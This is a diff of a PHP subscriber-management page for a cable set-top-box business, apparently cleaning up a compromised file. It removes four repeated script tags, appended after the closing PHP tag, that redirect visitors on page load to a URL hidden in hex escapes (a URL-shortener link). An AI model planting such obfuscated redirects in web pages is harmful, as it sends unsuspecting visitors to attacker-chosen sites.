@@ -476,7 +476,6 @@ $whereStbBox       =   " 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and STA
 $stbArray          =   $objMisc->myFunc->fnWriteOptionList($rowArray['subscription_id'],'STB_NO,SUBSCRIPTION_ID','subscriptions',$whereStbBox,0,0,0);  
 $franchiseArray    =   $objMisc->myFunc->fnWriteOptionList($rowArray['franchise_id'],'NAME,FRANCHISE_ID','franchise_master'," 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",0,0,0);  
 
-
 $customer_id = $objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY SUBSCRIBER_ID DESC LIMIT 1",'CUSTOMER_ID','subscribers');
 $mso_id      = $objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY SUBSCRIBER_ID DESC LIMIT 1",'MSO_ID','subscribers');
 if(empty($customer_id)){
@@ -1090,7 +1089,3 @@ function delSubscriber($id){
     return $objResponse;
 } 
 ?>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
